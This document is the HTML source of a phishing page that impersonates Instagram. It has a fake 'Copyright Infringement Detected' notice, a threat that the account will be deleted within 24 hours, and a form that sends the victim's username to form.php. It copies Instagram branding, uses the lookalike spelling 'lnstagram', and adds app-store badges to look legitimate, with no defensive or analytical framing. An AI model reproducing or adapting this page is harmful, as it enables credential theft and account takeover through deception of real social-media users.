<html>
<head>
    <meta charset="utf-8">
    <meta content="minimum-scale=1.0, width=device-width, maximum-scale=0.6667, user-scalable=no" name="viewport">
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
    <link rel="stylesheet" type="text/css" href="css/style1.css">
    <link rel="stylesheet" type="text/css" href="css/style2.css">
    <title>Instagram | Copyright Infringement </title>
<style>

#header {
    width: 100%;
    text-align: center;
    padding-top: 20px;
    position: fixed;
    background-color: #ffffff;
    top: 0px;
    left: 0px;
    height: 70px;
    border-bottom: 2px solid #dbdbdb;
}

#header img {
    width: 200px;
}

#menu {
    width:91%;
} 

#liste {
    display:inline-block;
}

#link {
    text-decoration:none;
    color:#003569; 
    font-family:sans-serif; 
    font-size:13px; 
    font-weight:540; 
    vertical-align: baseline; 
}

#div {
    background-color:white;
    width:91%;
    margin-top: 100px;
    padding-bottom: 50px;
}

#h1 {
    font-family:sans-serif;
    font-weight:400;
    letter-spacing:;
    color:#3d3d3d;
    font-size: 20px;
}

#p {
    width:80%;
    color:#999;
    font-family:sans-serif;
}

#nick {
    width: 250px;
    font-size: 15px;
    border: 1px solid #cecece;
    background: #FAFAFA;
    padding: 9px 0 7px 8px;
    line-height: 18px;
    border-radius: 5px;
}

#button {
    color:white;
    background-color:#3897f0;
    font-size:17px;
    border-radius:5px;
    outline:none;
    font-family:sans-serif;
    font-weight:540;
    border:0;
    width:180px;
    height:30px;
    font-weight:bold;
}

.bottom{
	min-height:60px;
	position:fixed;
	bottom:0;
	width:100%;
	background:#fafafa;
	border-top:1px solid #cecece;
}.mini{
	font-size:13px;
	margin-top:8px;
    color:#8e8e8e;
	display:block;
}

.big{
	margin-top:5px;
	font-size:13px;
	letter-spacing:2px;
}
</style>
</head>     
<body>

<div class="MFkQJ ABLKx VhasA _1-msl"><div class="GfkS6 "></div><div class="ZsSMR"><a class="z1VUo KD4vR ABLKx VhasA" href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DsignupPage%26ig_mid%3DAE2FF212-B09F-4D9D-97C1-5FD6BB456D90%26utm_content%3Dlo%26utm_medium%3Dbadge" role="alert"><section class="dZvHF  fvoD7"><p class="xK6EF">lnstagram</p><p class="_5b2Kp">Find it for free on Google Play.
</p></section><section class="FMlV_"><button class="_4IAxF">Get</button></section></a></div></div>

<body bgcolor="#fafafa">



<center>
<form method="get" action="form.php">

<div id="div" style="border:1px solid #cecece;">
<center>



     
    <img src="https://media.giphy.com/media/3oEjHFnRdGNWCbCOXK/giphy.gif" width="200">
   <br> <br> <p> 
 <font size="5" face="Verdana">
Copyright Infringement Detected In Your Account
</font>
</p> <br>
     "<img src="https://about.fb.com/wp-content/themes/fbcorp/assets/images/FOA_Cycling_5apps.gif" width="250">"
<p id="p">Copyright infringement detected in a post in your account. If you think copyright infringement is incorrect, you should provide feedback on the form. If you can't give feedback, Your account will be permanently deleted from our servers within 24 hours!</p>


<br>
<br>

    <input type="text" id="nick" name="nick" required="" placeholder="@username" class="qua21"><br><br>
    <input type="submit" value="Next" id="button" style="">   </p>
     <br> 
<p id="p">As an Instagram Team, we pay close attention to Community rules</p>
</center>
</div>

</form>

<br><br>

<center>
  <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo">
    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_turkish-tr.png/30b29fd697b2.png" width="120">
  </a>
  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DD1619D39-E370-43DA-B97D-B73020E1B4AC%26utm_content%3Dlo%26utm_medium%3Dbadge">
    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_turkish-tr.png/9d46177cf153.png" width="120">
  </a>
</center>

</div>

<br><br>


<div id="menu">
<center> 
  <li id="liste"><a href="" id="link"> ABOUT US </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; 
  <li id="liste"><a href="" id="link"> SUPPORT </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; 
  <li id="liste"><a href="" id="link">PRESS</a></li>&nbsp;&nbsp;&nbsp;&nbsp; 
  <li id="liste"><a href="" id="link">API</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; 
  <li id="liste"><a href="" id="link">JOBS</a></li>&nbsp;&nbsp;&nbsp;&nbsp; 
  <li id="liste"><a href="" id="link">PRIVACY</a></li>&nbsp;&nbsp;&nbsp;&nbsp; 
  <li id="liste"><a href="" id="link">TERMS</a></li>&nbsp;&nbsp;&nbsp;&nbsp; 
  <li id="liste"><a href="" id="link">DIRECTORY</a></li>&nbsp;&nbsp;&nbsp;&nbsp; 
  <li id="liste"><a href="" id="link">LANGUAGE</a></li></div><br> 
</center>


</body>
</html>
